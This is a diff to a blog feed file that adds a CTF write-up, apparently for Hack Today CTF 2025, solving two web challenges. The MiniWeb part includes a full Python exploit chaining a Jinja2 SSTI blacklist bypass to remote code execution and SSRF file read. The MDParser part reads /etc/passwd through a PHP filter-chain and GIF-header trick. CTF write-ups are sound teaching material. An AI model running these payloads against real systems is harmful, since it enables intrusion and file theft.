@@ -4,6 +4,35 @@
   
     
     <entry>
+      <title>Hack Today CTF 2025 Writeup</title>
+      <link href="/2026/07/16/Hack-Today-CTF-2025-Writeup/"/>
+      <url>/2026/07/16/Hack-Today-CTF-2025-Writeup/</url>
+      
+        <content type="html"><![CDATA[<h1 id="MiniWeb"><a href="#MiniWeb" class="headerlink" title="MiniWeb"></a>MiniWeb</h1><p><img src="/../images/Hack-Today-CTF-2025-Writeup.png"></p><p>There are 2 applications:</p><ul><li>Front-server (accessible at port 5001)</li><li>Internal-server (only accessible locally)</li></ul><p><img src="/../images/Hack-Today-CTF-2025-Writeup-1.png"></p><p>This already indicates that we need to perform an SSRF to the internal-server.</p><p>At <a href="http://103.160.212.3:5001/sub">http://103.160.212.3:5001/sub</a>, there is an SSTI vulnerability, but the user input is sanitized first.<br><img src="/../images/Hack-Today-CTF-2025-Writeup-2.png"></p><p>Yeah, this is their sanitation function that we have to bypass—just read it yourself lol.<br><img src="/../images/Hack-Today-CTF-2025-Writeup-3.png"></p><p>Let’s just list all the available classes. We want to access the <code>os._wrap_close</code> class, but the problem is we can’t use <code>[&lt;index&gt;]</code> because <code>[]</code> is blacklisted.<br><img src="/../images/Hack-Today-CTF-2025-Writeup-4.png"></p><p>The way to bypass it is:</p><pre><code class="language-python">{{'abcdef'|slice(2)|first}} ⇒ ['a', 'b', 'c']{{'abcdef'|slice(2)|reverse|first}} ⇒ ['d', 'e', 'f']{{'abcdef'|slice(2)|first|slice(2)|first}} ⇒ ['a', 'b']{{'abcdef'|slice(2)|first|slice(2)|reverse|first}} ⇒ ['c']</code></pre><p>Yeah.. basically, we’re going to keep using slice, reverse, and first until we get the <code>os.wrap_close</code> class.<br><img src="/../images/Hack-Today-CTF-2025-Writeup-5.png"></p><p>We access the os <code>init</code> globals, and our goal is to get <code>popen</code>. The problem is <code>.__init__.__globals__.popen</code> won’t work because <code>popen</code> is blacklisted, so the way to bypass it is by using <code>|attr('get')('po'~'pen')</code>.<br><img src="/../images/Hack-Today-CTF-2025-Writeup-6.png"><br><img src="/../images/Hack-Today-CTF-2025-Writeup-7.png"></p><p>Nice, got RCE!<br><img src="/../images/Hack-Today-CTF-2025-Writeup-8.png"></p><p>Next, we want to SSRF into the internal service, but <code>curl</code> isn’t available. Fortunately, the <code>requests</code> library is installed in their <code>requirements.txt</code>, so we can do the SSRF using the <code>requests</code> library.</p><p>If we look at the internal service, the flag is located in the root directory (<code>/flag.txt</code>), so we most likely need to achieve an arbitrary file read.<br><img src="/../images/Hack-Today-CTF-2025-Writeup-9.png"></p><p>The endpoint <a href="http://internal-server:9000/">http://internal-server:9000/</a> accepts a <code>url</code> parameter, which will be fetched via <code>curl</code>. However, the protocol of this URL will be checked.<br><img src="/../images/Hack-Today-CTF-2025-Writeup-10.png"></p><p>If the URL is <code>file:///flag.txt</code> ⇒ it gets blacklisted. The bypass here is using <code>filE:///flag.txt</code>—when parsed, the protocol becomes <code>filE</code> 😀 (it’s case-sensitive, bro…).</p><pre><code class="language-python">import requestsimport base64URL = "[http://103.160.212.3:5001](http://103.160.212.3:5001)"  python_code = '''import requests; res = requests.get('http://internal-server:9000/?url=filE:///flag.txt'); print(res.text)'''python = base64.b64encode(f"""python3 -c "{python_code}" """.encode()).decode()payload = f"""{{{{(''.__class__.__base__.__subclasses__()|slice(2)|first|reverse|slice(2)|first|reverse|slice(33)|first|reverse|slice(4)|first|first).__init__|attr('__glo'~'bals__')|attr('get')('po'~'pen')('''echo {python} | base64 -d | bash''')|attr('re'~'ad')()}}}}"""  res = requests.get(URL + "/sub", params={'name':payload})print(res.text)</code></pre><p><img src="/../images/Hack-Today-CTF-2025-Writeup-11.png"></p><h1 id="MDParser"><a href="#MDParser" class="headerlink" title="MDParser"></a>MDParser</h1><p><img src="/../images/Hack-Today-CTF-2025-Writeup-12.png"></p><p>We are given 1 app. If we check the Dockerfile, the flag is located at <code>/home/&lt;random-user&gt;/flag.txt</code>.<br><img src="/../images/Hack-Today-CTF-2025-Writeup-13.png"></p><p>We most likely need to get an arbitrary read. The <code>/etc/passwd</code> file will leak that random username. Then we can read the flag at <code>/home/&lt;random-user&gt;/flag.txt</code>.</p><p>When we input <code>![test](http://evil.com)</code> into the markdown parser, it turns into this:<br><img src="/../images/Hack-Today-CTF-2025-Writeup-14.png"></p><p>If the URL points to a valid image, the rendered result looks like this, with the image encoded in base64:<br><img src="/../images/Hack-Today-CTF-2025-Writeup-15.png"></p><p>By looking at the <code>imageSourceFromPath</code> function, we can see that if the retrieved data is an image, it will display its content.<br><img src="/../images/Hack-Today-CTF-2025-Writeup-16.png"></p><p>Now, let’s say <code>file:///test.txt</code> contains the header “GIF89a; [content here]”. The contents of <code>test.txt</code> will be revealed. Why? Because <code>finfo_buffer</code> predicts the mime type just by looking at the beginning of the file (basically, it’s just looking for the magic header).</p><p><img src="/../images/Hack-Today-CTF-2025-Writeup-18.png"></p><p>So, how do we prepend <code>GIF89a</code> to the contents of the <code>/etc/passwd</code> file?</p><p>Well, there’s something called a PHP filter chain (<a href="https://github.com/synacktiv/php_filter_chain_generator">https://github.com/synacktiv/php_filter_chain_generator</a>).</p><p><img src="/../images/Hack-Today-CTF-2025-Writeup-19.png"></p><p>Basically, it generates a PHP filter that can construct a specific string, like <code>GIF89a</code>.</p><p>So when we curl using that link, the prefix will be <code>GIF89a</code> (followed by some junk data).<br><img src="/../images/Hack-Today-CTF-2025-Writeup-20.png"></p><p>Now, we change <code>resource=php://temp</code> to <code>resource=/etc/passwd</code>.<br><img src="/../images/Hack-Today-CTF-2025-Writeup-21.png"></p><p>Now it becomes <code>GIF89a</code> + junk + the content of <code>/etc/passwd</code>. <code>finfo_buffer()</code> still detects this as <code>image/gif</code> 😀 (since it starts with <code>GIF89a</code>).</p><p>And just like that, we got the username…<br><img src="/../images/Hack-Today-CTF-2025-Writeup-22.png"></p><p>Now we just need to read <code>/home/userfbszb7za/flag.txt</code>.<br><img src="/../images/Hack-Today-CTF-2025-Writeup-23.png"></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> writeups </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> ssrf </tag>
+            
+            <tag> arbitrary-file-read </tag>
+            
+            <tag> ssti </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>Cyber Jawara CTF 2025 Writeup</title>
       <link href="/2026/07/16/Cyber-Jawara-CTF-2025-Writeup/"/>
       <url>/2026/07/16/Cyber-Jawara-CTF-2025-Writeup/</url>
@@ -20,11 +49,11 @@
       
         <tags>
             
-            <tag> xss </tag>
-            
             <tag> css-injection </tag>
             
             <tag> idor </tag>
+            
+            <tag> xss </tag>
             
             <tag> csp-bypass </tag>
             
@@ -62,7 +91,7 @@
     
     
     <entry>
-      <title>SCHEMATICS CTF 2025 Writeup</title>
+      <title>Schematics CTF 2025 Writeup</title>
       <link href="/2026/07/14/SCHEMATICSCTF-2025-Writeup/"/>
       <url>/2026/07/14/SCHEMATICSCTF-2025-Writeup/</url>
       
@@ -184,11 +213,11 @@
             
             <tag> ssrf </tag>
             
+            <tag> ssti </tag>
+            
             <tag> mass-assignment </tag>
             
             <tag> nginx-misconfig </tag>
-            
-            <tag> ssti </tag>
             
             <tag> command-injection </tag>
             
